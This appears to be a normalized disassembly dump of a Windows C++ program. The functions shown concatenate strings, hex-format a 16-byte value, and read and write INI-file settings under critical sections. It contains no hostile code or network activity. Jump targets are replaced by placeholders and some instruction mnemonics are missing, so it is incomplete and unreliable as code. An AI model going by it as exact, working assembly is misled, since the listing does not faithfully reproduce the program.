call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ esp + 0x3c ]
push ecx
mov ecx ebp
call sub_41e230
test al al
je r-xdata
cmp [ esp + 0x50 ] esi
jbe r-xdata
lea ecx [ esp + 0x58 ]
push ecx
lea ecx [ esp + 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push r--data
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push r--data
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea edx [ esp + 0x3c ]
push edx
mov ecx ebp
call sub_41e450
test al al
je r-xdata
mov eax [ esp + 0x50 ]
xor esi esi
test eax eax
jbe r-xdata
mov bl 0x4
jmp r-xdata
lea edx [ esp + 0x58 ]
push edx
lea ecx [ esp + 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push r--data
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push r--data
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea eax [ esp + 0x3c ]
push eax
mov ecx ebp
call sub_41ebe0
cmp al 0x1
jne r-xdata
mov eax [ esp + 0x50 ]
xor esi esi
test eax eax
jbe r-xdata
mov bl 0x5
jmp r-xdata
push esi
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
xor ecx ecx
mov cl [ eax ]
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_429290
add esp 0x8
mov [ esp + 0x148 ] bl
push eax
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x148 ] 0x3
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x50 ]
inc esi
cmp esi eax
jb r-xdata
lea eax [ esp + 0x58 ]
push eax
lea ecx [ esp + 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
xor ecx ecx
mov [ esp + 0x75 ] ecx
mov [ esp + 0x79 ] ecx
mov [ esp + 0x7d ] ecx
mov [ esp + 0x81 ] ecx
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x74 ] 0x0
call sub_41d6e0
mov eax r--data
lea edx [ eax + 0x1 ]
nop
mov eax [ esp + 0x50 ]
xor esi esi
test eax eax
jbe r-xdata
mov bl 0x6
jmp r-xdata
push esi
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
xor edx edx
mov dl [ eax ]
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_429290
add esp 0x8
mov [ esp + 0x148 ] bl
push eax
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x148 ] 0x3
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x50 ]
inc esi
cmp esi eax
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax r--data
mov [ esp + 0x10 ] esi
lea edx [ eax + 0x1 ]
mov bl 0x7
push esi
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
movzx eax [ eax ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
call sub_429290
add esp 0x8
mov [ esp + 0x148 ] bl
push eax
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x148 ] 0x3
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x50 ]
inc esi
cmp esi eax
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ esp + 0x9c ]
sub eax edx
mov [ esp + 0x18 ] ebx
add ebx eax
add ebx esi
push ebx
mov [ esp + 0x20 ] eax
call j_sub_42e3bc
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
push esi
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
xor ecx ecx
mov cl [ eax ]
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_429290
add esp 0x8
mov [ esp + 0x148 ] bl
push eax
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x148 ] 0x3
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x50 ]
inc esi
cmp esi eax
jb r-xdata
mov ecx ebx
mov edx ecx
shr ecx 0x2
xor eax eax
mov edi ebp
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx esi
mov eax ecx
shr ecx 0x2
mov esi r--data
mov edi ebp
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
lea edi [ ecx + ebp ]
lea ecx [ esp + 0x88 ]
mov [ esp + 0x10 ] edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
mov eax [ esp + 0x18 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
add edi eax
mov eax ecx
shr ecx 0x2
mov esi r--data
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
push ebp
lea ecx [ esp + 0xec ]
call sub_41e010
lea ecx [ esp + 0x74 ]
push ecx
lea ecx [ esp + 0xe8 ]
call sub_41e0d0
push ebp
call ??_V@YAXPAX@Z
mov ebx [ sprintf@IAT ]
xor edx edx
mov [ esp + 0xa9 ] edx
mov [ esp + 0xad ] edx
mov [ esp + 0xb1 ] edx
mov [ esp + 0xb5 ] edx
mov [ esp + 0xb9 ] edx
mov [ esp + 0xbd ] edx
mov [ esp + 0xc1 ] edx
mov [ esp + 0xc5 ] edx
add esp 0x4
mov [ esp + 0xa4 ] 0x0
mov [ esp + 0xc5 ] dx
xor esi esi
lea edi [ esp + 0xa4 ]
lea esp [ esp ]
mov esi [ esp + 0x150 ]
lea edx [ esp + 0x88 ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] edi
jmp r-xdata
movzx eax [ esp + esi + 0x74 ]
push eax
push r--data
push edi
call ebx
add esp 0xc
inc esi
add edi 0x2
cmp esi 0x10
jl r-xdata
lea ecx [ esp + 0xa4 ]
push ecx
lea ecx [ esp + 0xcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x148 ] 0x8
mov esi [ esp + 0x150 ]
lea edx [ esp + 0xc8 ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x148 ] 0x3
lea ecx [ esp + 0xc8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x148 ] 0x2
lea ecx [ esp + 0x88 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x148 ] 0x1
lea ecx [ esp + 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x148 ] 0x0
lea ecx [ esp + 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x140 ]
pop edi
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x130 ]
pop ebx
call sub_42e72f
add esp 0x13c
retn 0x4
sub_4202b0
push 0xffffffff
push sub_43221c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x38 ] 0x0
lea edi [ esi + 0x1c ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x38 ] 0x1
lea ebp [ esi + 0x38 ]
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov bl 0x2
mov [ esp + 0x38 ] bl
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
call sub_41fa80
mov [ esp + 0x38 ] 0x3
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x38 ] bl
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call sub_41fbe0
mov [ esp + 0x38 ] 0x4
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x38 ] bl
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea edx [ esp + 0x14 ]
push edx
mov ecx esi
call sub_41fd80
mov [ esp + 0x38 ] 0x5
push eax
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x38 ] bl
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x38 ] 0xffffffff
mov ecx [ esp + 0x30 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_4203a0
push 0xffffffff
push sub_432243
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push rw-data
mov [ esp + 0x4 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
mov esi eax
mov [ esp + 0x14 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
push 0x54
call sub_42e3bc
add esp 0x4
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_4202b0
jmp r-xdata
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] eax
sub_420430
push 0xffffffff
push sub_432273
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x8 ]
mov [ esi ] r--data
push eax
mov [ esp + 0x8 ] esi
mov [ esi + 0x4 ] r--data
call [ InitializeCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
push r--data
lea ecx [ esi + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x1
push r--data
lea ecx [ esi + 0x40 ]
mov [ esi + 0x3c ] 0x4
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4204b0
push 0xffffffff
push sub_4322a3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] r--data
add esi 0x8
push esi
call [ DeleteCriticalSection@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_420540
push 0xffffffff
push sub_4322bb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0x5c
call sub_42e3bc
add esp 0x4
mov [ esp ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_420430
jmp r-xdata
mov [ esp + 0xc ] 0xffffffff
mov [ rw-data ] eax
sub_4205c0
push 0xffffffff
push sub_4322ea
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
add ecx 0x20
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push ecx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_420620
push 0xffffffff
push sub_43231a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
add ecx 0x40
mov [ esp + 0x4 ] 0x0
mov esi [ esp + 0x18 ]
push ecx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4206b0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn 0x10
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push ecx
push esi
push 0xffffffff
push eax
push 0x0
push edx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
pop esi
retn 0x10
sub_420710
push ebp
lea ebp [ esp - 0x7e4 ]
push 0xffffffff
push sub_432355
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x858
mov eax [ rw-data ]
push ebx
push esi
mov [ ebp + 0x7d4 ] eax
lea eax [ ecx + 0x4 ]
xor esi esi
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x80 ] eax
add eax 0x4
push edi
push eax
mov [ ebp - 0x7c ] eax
call [ EnterCriticalSection@IAT ]
mov [ ebp + 0x7e0 ] 0x1
call [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x60 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
lea eax [ ebx + ebx ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp - 0x6c ] esi
jmp r-xdata
mov [ ebp - 0x6c ] 0x0
mov eax [ ebp - 0x60 ]
push ebx
mov ebx [ MultiByteToWideChar@IAT ]
push esi
push 0xffffffff
push edi
push 0x0
push eax
mov [ esi ] 0x0
call ebx
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ebx [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x74 ] 0x0
mov eax [ ebp - 0x60 ]
push edi
push esi
push 0xffffffff
lea edx [ ebp - 0x5c ]
push edx
push 0x0
push eax
mov [ esi ] 0x0
call ebx
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x74 ] eax
jmp r-xdata
lea ecx [ ebp - 0x5c ]
push ecx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp - 0x70 ] 0x0
push eax
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp + 0x7f8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
test eax eax
mov [ ebp - 0x64 ] eax
je r-xdata
mov [ ebp - 0x68 ] 0x0
push eax
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x60 ]
push edi
push esi
push 0xffffffff
push ecx
push 0x0
push edx
mov [ esi ] 0x0
call ebx
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
push eax
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x60 ]
push edi
push esi
push 0xffffffff
push eax
push 0x0
push ecx
mov [ esi ] 0x0
call ebx
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x68 ] eax
jmp r-xdata
mov ecx [ ebp + 0x7f4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
test eax eax
mov [ ebp - 0x64 ] eax
je r-xdata
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x60 ]
push edi
push esi
push 0xffffffff
push edx
push 0x0
push eax
mov [ esi ] 0x0
call ebx
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov ecx [ ebp + 0x7f0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
test eax eax
mov [ ebp - 0x64 ] eax
je r-xdata
mov ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x74 ]
push ecx
mov ecx [ ebp - 0x70 ]
push 0x830
push edx
mov edx [ ebp - 0x68 ]
push ecx
push edx
push eax
call [ GetPrivateProfileStringW@IAT ]
mov esi [ ebp + 0x7ec ]
lea eax [ ebp - 0x5c ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x78 ] 0x1
mov [ ebp + 0x7e0 ] 0x0
mov ecx [ ebp - 0x7c ]
push ecx
call [ LeaveCriticalSection@IAT ]
mov eax esi
lea esp [ ebp - 0x8c ]
mov ecx [ ebp + 0x7d8 ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp + 0x7d4 ]
call sub_42e72f
pop edi
pop esi
pop ebx
add ebp 0x7e4
mov esp ebp
pop ebp
retn 0x10
sub_420990
push ebp
mov ebp esp
push 0xffffffff
push sub_432368
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
lea eax [ ecx + 0x4 ]
push esi
mov [ ebp - 0x1c ] eax
add eax 0x4
push edi
push eax
mov [ ebp - 0x18 ] eax
call [ EnterCriticalSection@IAT ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
lea eax [ ebx + ebx ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebp + 0x10 ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp + 0xc ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0x10 ] eax
jmp r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov edx [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push edx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ecx
push eax
call [ WritePrivateProfileStringW@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp - 0x18 ]
push edx
call [ LeaveCriticalSection@IAT ]
lea esp [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_420b60
push ebp
mov ebp esp
push 0xffffffff
push sub_432388
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
lea eax [ ecx + 0x4 ]
push esi
mov [ ebp - 0x1c ] eax
add eax 0x4
push edi
push eax
mov [ ebp - 0x18 ] eax
call [ EnterCriticalSection@IAT ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
lea eax [ ebx + ebx ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebp + 0xc ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push edx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ecx
push eax
call [ GetPrivateProfileIntW@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp - 0x18 ]
push edx
call [ LeaveCriticalSection@IAT ]
mov eax esi
lea esp [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_420ce0
push ebp
lea ebp [ esp - 0x6c ]
push 0xffffffff
push sub_4323ba
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
mov eax [ rw-data ]
push ebx
mov [ ebp + 0x5c ] eax
lea eax [ ecx + 0x4 ]
push esi
mov [ ebp + 0x2c ] eax
add eax 0x4
push edi
push eax
mov [ ebp + 0x30 ] eax
call [ EnterCriticalSection@IAT ]
xor edi edi
mov [ ebp + 0x68 ] edi
push 0x1
push 0x2
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0x68 ] 0x1
mov eax [ ebp + 0x7c ]
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
lea ecx [ ebp + 0x40 ]
push ecx
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::str@IAT ]
mov [ ebp + 0x68 ] 0x2
call [ rw-data ]
mov ecx rw-data
mov [ ebp + 0x7c ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
lea eax [ ebx + ebx ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov edi esp
test edi edi
je r-xdata
mov [ ebp + 0x34 ] edi
jmp r-xdata
mov [ ebp + 0x34 ] 0x0
mov edx [ ebp + 0x7c ]
push ebx
push edi
push 0xffffffff
push esi
push 0x0
push edx
mov [ edi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax edi
mov [ ebp + 0x34 ] eax
jmp r-xdata
lea ecx [ ebp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
